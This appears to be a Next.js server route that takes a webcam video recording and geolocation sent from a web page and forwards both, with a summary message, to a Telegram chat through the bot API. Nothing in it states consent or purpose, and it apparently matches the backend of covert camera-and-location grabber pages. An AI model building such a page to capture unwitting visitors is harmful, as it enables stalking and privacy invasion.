import { NextRequest, NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function POST(req: NextRequest) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is not set in environment variables.");
    return NextResponse.json(
      { error: "Telegram bot token or chat ID is not configured." },
      { status: 500 }
    );
  }

  try {
    const { video, latitude, longitude } = await req.json(); // Expecting video, not selfie or separate audio

    const messages: Promise<Response>[] = [];

    // Send Video
    if (video) {
      console.log("Attempting to send video...");
      const base64Data = video.replace(/^data:video\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video.webm");

      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { // Changed to sendVideo
          method: "POST",
          body: formData,
        }).then(async res => {
          console.log("Video API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text(); // Get full error body
            console.error("Video API error response:", errorBody);
          }
          return res;
        })
      );
    }

    // Send Location
    if (latitude && longitude) {
      console.log("Attempting to send location...");
      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            latitude: latitude,
            longitude: longitude,
          }),
        }).then(async res => {
          console.log("Location API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text(); // Get full error body
            console.error("Location API error response:", errorBody);
          }
          return res;
        })
      );
    }

    // Send a text message summary
    let summaryText = "Received data from web app:";
    if (video) summaryText += "\n- Video recorded."; // Updated summary for video
    if (latitude && longitude) summaryText += `\n- Location: Lat ${latitude}, Lng ${longitude}.`;
    if (!video && !latitude && !longitude) summaryText = "No data received from web app (permissions denied or unavailable)."; // Updated condition

    messages.push(
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: summaryText,
        }),
      }).then(async res => {
        console.log("Summary message API response status:", res.status);
        if (!res.ok) {
            const errorBody = await res.text(); // Get full error body
            console.error("Summary message API error response:", errorBody);
        }
        return res;
      })
    );

    await Promise.allSettled(messages);

    return NextResponse.json({ message: "Data processed and sent to Telegram." });
  } catch (error: any) {
    console.error("Error processing Telegram request:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}